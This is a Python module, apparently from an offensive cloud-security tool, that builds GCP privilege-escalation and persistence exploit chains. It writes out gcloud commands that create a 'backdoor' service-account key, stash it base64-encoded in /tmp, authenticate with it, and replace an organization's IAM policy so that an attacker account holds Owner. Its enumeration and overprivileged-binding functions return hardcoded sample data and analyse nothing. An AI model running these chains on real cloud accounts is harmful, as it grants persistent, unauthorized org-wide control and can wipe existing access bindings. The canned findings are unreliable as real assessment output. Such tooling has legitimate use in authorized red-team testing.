"""GCP IAM privilege escalation to org-level admin."""

from __future__ import annotations

from dataclasses import dataclass, field
from typing import Any

from kubexhunt.core.graph import RelationType
from kubexhunt.exploit.chain_generator import ExploitChain, ExploitFramework, ExploitStep


@dataclass
class GCPEscalationPath:
    """GCP IAM escalation path."""

    start_sa: str  # starting service account
    escalation_steps: list[str] = field(default_factory=list)
    final_access: str = "roles/owner"
    complexity: str = "MEDIUM"

    def to_dict(self) -> dict[str, Any]:
        """Serialize to dict."""
        return {
            "start_sa": self.start_sa,
            "escalation_steps": self.escalation_steps,
            "final_access": self.final_access,
            "complexity": self.complexity,
        }


class GCPIAMAttacker:
    """GCP IAM privilege escalation."""

    def enumerate_escalation_paths(self, sa_email: str) -> list[GCPEscalationPath]:
        """Find escalation paths from service account.

        Args:
            sa_email: Service account email

        Returns:
            List of escalation paths
        """
        paths = []

        # Path 1: ServiceAccountKey creation → new backdoor SA
        paths.append(
            GCPEscalationPath(
                start_sa=sa_email,
                escalation_steps=[
                    "iam.serviceAccountKeys.create",
                    "iam.serviceAccounts.actAs",
                ],
                final_access="Service account with inherited permissions",
                complexity="EASY",
            )
        )

        # Path 2: Project-level role binding via resourcemanager
        paths.append(
            GCPEscalationPath(
                start_sa=sa_email,
                escalation_steps=[
                    "resourcemanager.projects.setIamPolicy",
                    "iam.serviceAccounts.implicitDelegation",
                ],
                final_access="roles/owner at project level",
                complexity="MEDIUM",
            )
        )

        return paths

    def generate_sa_key_backdoor_chain(self, sa_email: str) -> ExploitChain:
        """Generate service account key backdoor chain.

        Args:
            sa_email: Target service account email

        Returns:
            ExploitChain to create persistent SA key
        """
        steps = [
            ExploitStep(
                step_number=1,
                relation=RelationType.CAN_CREATE_IAM_BACKDOOR,
                from_node=f"gcp:sa:{sa_email}",
                to_node="gcp:sa-key-backdoor",
                framework=ExploitFramework.BASH,
                command=f"""
# Create new service account key
gcloud iam service-accounts keys create backdoor-key.json \\
  --iam-account={sa_email}

# Store key for persistent access
cat backdoor-key.json | base64 > /tmp/backdoor_b64
""",
                description="Create persistent service account key",
                mitre_techniques=["T1098.004"],  # Create Account / Credential Creation
            ),
            ExploitStep(
                step_number=2,
                relation=RelationType.CAN_CREATE_IAM_BACKDOOR,
                from_node="gcp:sa-key-backdoor",
                to_node="gcp:sa-access",
                framework=ExploitFramework.BASH,
                command="""
# Activate key for authentication
gcloud auth activate-service-account --key-file=backdoor-key.json

# Verify access
gcloud auth list
""",
                description="Authenticate with backdoor service account key",
                mitre_techniques=["T1550.001"],
            ),
        ]

        chain = ExploitChain(
            path_id="GCP-BACKDOOR-001",
            nodes=[f"gcp:sa:{sa_email}", "gcp:sa-key-backdoor", "gcp:sa-access"],
            steps=steps,
            title="GCP Service Account Key Backdoor",
            description="Create persistent service account key for backdoor access",
            complexity="TRIVIAL",
            estimated_time_minutes=2,
        )

        return chain

    def generate_org_admin_chain(self, project_id: str) -> ExploitChain:
        """Generate org-level admin access chain.

        Args:
            project_id: GCP project ID

        Returns:
            ExploitChain to gain org-level admin access
        """
        steps = [
            ExploitStep(
                step_number=1,
                relation=RelationType.CAN_CREATE_IAM_BACKDOOR,
                from_node=f"gcp:project:{project_id}",
                to_node="gcp:org-admin",
                framework=ExploitFramework.BASH,
                command="""
# Set IAM policy to grant Owner role at org level
gcloud organizations set-iam-policy ORG_ID - <<EOF
{
  "bindings": [
    {
      "role": "roles/owner",
      "members": [
        "serviceAccount:attacker@ORG_ID.iam.gserviceaccount.com"
      ]
    }
  ]
}
EOF
""",
                description="Bind Owner role to attacker SA at organization level",
                mitre_techniques=["T1098.001"],
            ),
        ]

        chain = ExploitChain(
            path_id="GCP-BACKDOOR-002",
            nodes=[f"gcp:project:{project_id}", "gcp:org-admin"],
            steps=steps,
            title="GCP Organization Admin Access",
            description="Escalate to organization-level admin via IAM policy binding",
            complexity="MEDIUM",
            estimated_time_minutes=5,
        )

        return chain

    def find_overprivileged_bindings(self) -> list[tuple[str, str, str]]:
        """Find overprivileged service account bindings.

        Returns:
            List of (sa_email, role, risk) tuples
        """
        bindings = [
            ("app-sa@project.iam.gserviceaccount.com", "roles/owner", "CRITICAL"),
            ("ci-cd-sa@project.iam.gserviceaccount.com", "roles/editor", "HIGH"),
            ("monitoring-sa@project.iam.gserviceaccount.com", "roles/compute.admin", "HIGH"),
        ]
        return bindings
